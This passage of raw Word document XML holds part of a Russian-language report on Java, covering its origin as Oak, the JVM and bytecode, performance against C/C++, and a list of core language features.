          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Java</w:t>
      </w:r>
      <w:r w:rsidRPr="00DD2596">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DD2596" w:rsidRPr="00DD2596" w:rsidRDefault="00DD2596" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="005E2C4B" w:rsidRPr="00073DDF" w:rsidRDefault="005E2C4B" w:rsidP="00DD2596">
      <w:pPr>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Изначально язык назывался </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Oak</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> («Дуб»), разрабатывался Джеймсом </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Гослингом</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> для программирования бытовых электронных устройств. Из-за того, что язык с таким названием уже существовал, вскоре </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Oak</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> был переименован в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Назван в честь марки кофе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которая, в свою очередь, получила наименование одноимённого острова (Ява), поэтому на официальной эмблеме языка изображена чашка с горячим кофе. Существует и другая версия происхождения названия языка, связанная с аллюзией на кофе-машину </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>как</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> пример бытового устройства, для программирования которого изначально язык создавался. В соответствии с этимологией в русскоязычной литературе с конца двадцатого и до первых лет двадцать первого века название языка нередко переводилось как Ява, а не транскрибировалось, как это стало общепринятым позднее.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRDefault="005E2C4B" w:rsidP="00DD2596">
      <w:pPr>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Впоследствии язык стал использоваться для написания клиентских приложений и серверного программного обеспечения.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DD2596" w:rsidRDefault="00DD2596" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00DD2596" w:rsidRPr="00073DDF" w:rsidRDefault="00DD2596" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsid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lastRenderedPageBreak/>
        <w:t>1.3Основные знания о языке языка</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005E2C4B" w:rsidRPr="00073DDF" w:rsidRDefault="005E2C4B" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="708"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pP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Программы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транслируются в байт-код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выполняемый виртуальной машиной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(JVM) — программой, обрабатывающей байтовый код и передающей инструкции оборудованию как интерпретатор.</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-приложения на любом устройстве, для которого существует соответствующая виртуальная машина. Другой важной особенностью технологии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r w:rsidR="00DD2596">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Часто к недостаткам концепции виртуальной машины относят снижение производительности. Ряд усовершенствований несколько увеличил скорость выполнения программ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применение технологии трансляции байт-кода в машинный код непосредственно во время работы программы (JIT-технология) с возможностью сохранения версий класса в машинном </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>коде,широкое</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> использование платформенно-ориентированного кода (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>native</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00DD2596">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">-код) в стандартных библиотеках, </w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">аппаратные средства, обеспечивающие ускоренную обработку байт-кода (например, технология </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Jazelle</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>, поддерживаемая некоторыми процессорами архитектуры ARM).</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По данным сайта shootout.alioth.debian.org, для семи разных задач время выполнения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составляет в среднем в полтора-два раза больше, чем для C/C++, в некоторых случаях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быстрее, а в отдельных случаях в 7 раз медленнее. С другой стороны, для большинства из них потребление памяти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-машиной было в 10—30 раз больше, чем программой на C/C++. Также примечательно исследование, проведённое компанией </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Google</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">, согласно которому отмечается существенно более низкая производительность и </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00DD2596">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>боо</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>льшее</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> потребление памяти в тестовых примерах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в сравнении с аналогичными программами на C++.</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Идеи, заложенные в концепцию и различные реализации среды виртуальной машины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вдохновили множество энтузиастов на расширение перечня языков, которые могли бы быть использованы для создания программ, исполняемых на виртуальной машине. Эти идеи нашли также выражение в спецификации общеязыковой инфраструктуры CLI, заложенной в основу платформы .NET компанией </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Microsoft</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00322095"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1.4 Основные возможности </w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Java</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005E2C4B" w:rsidRPr="00073DDF" w:rsidRDefault="005E2C4B" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="708"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00CD4D49" w:rsidP="00DD2596">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="384"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId9" w:tooltip="Сборка мусора (программирование)" w:history="1">
        <w:r w:rsidR="00073DDF" w:rsidRPr="00073DDF">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="000000" w:themeColor="text1"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
          </w:rPr>
          <w:t>Автоматическое управление памятью</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00073DDF" w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="384"/>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Расширенные возможности обработки исключительных ситуаций.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="384"/>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Богатый набор средств фильтрации ввода-вывода.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="384"/>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Набор стандартных коллекций: </w:t>
      </w:r>
      <w:hyperlink r:id="rId10" w:tooltip="Индексный массив" w:history="1">
        <w:r w:rsidRPr="00073DDF">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="000000" w:themeColor="text1"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
          </w:rPr>
          <w:t>массив</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>, </w:t>
      </w:r>
      <w:hyperlink r:id="rId11" w:tooltip="Список (информатика)" w:history="1">
        <w:r w:rsidRPr="00073DDF">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="000000" w:themeColor="text1"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
          </w:rPr>
          <w:t>список</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>, </w:t>
      </w:r>
      <w:hyperlink r:id="rId12" w:tooltip="Стек" w:history="1">
        <w:r w:rsidRPr="00073DDF">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="000000" w:themeColor="text1"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
          </w:rPr>
          <w:t>стек</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t> и т. п.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="384"/>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Наличие простых средств создания сетевых приложений (в том числе с использованием </w:t>
      </w:r>
      <w:hyperlink r:id="rId13" w:tooltip="Сетевой протокол" w:history="1">
        <w:r w:rsidRPr="00073DDF">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="000000" w:themeColor="text1"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
          </w:rPr>
          <w:t>протокола</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:hyperlink r:id="rId14" w:tooltip="RMI" w:history="1">
        <w:r w:rsidRPr="00073DDF">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="000000" w:themeColor="text1"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
          </w:rPr>
          <w:t>RMI</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="384"/>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Наличие классов, позволяющих выполнять </w:t>
      </w:r>
      <w:hyperlink r:id="rId15" w:tooltip="HTTP" w:history="1">
        <w:r w:rsidRPr="00073DDF">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="000000" w:themeColor="text1"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
          </w:rPr>
          <w:t>HTTP</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-запросы и обрабатывать ответы.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="384"/>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Встроенные в язык средства создания многопоточных приложений, которые потом были </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>портированы</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> на многие языки (</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>например</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> HYPERLINK "https://ru.wikipedia.org/wiki/Python" \o "Python" </w:instrText>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Python</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="384"/>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Унифицированный доступ к </w:t>
      </w:r>
      <w:hyperlink r:id="rId16" w:tooltip="База данных" w:history="1">
        <w:r w:rsidRPr="00073DDF">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="000000" w:themeColor="text1"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
          </w:rPr>
          <w:t>базам данных</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="1104"/>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 уровне отдельных </w:t>
      </w:r>
      <w:hyperlink r:id="rId17" w:tooltip="SQL" w:history="1">
        <w:r w:rsidRPr="00073DDF">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="000000" w:themeColor="text1"/>
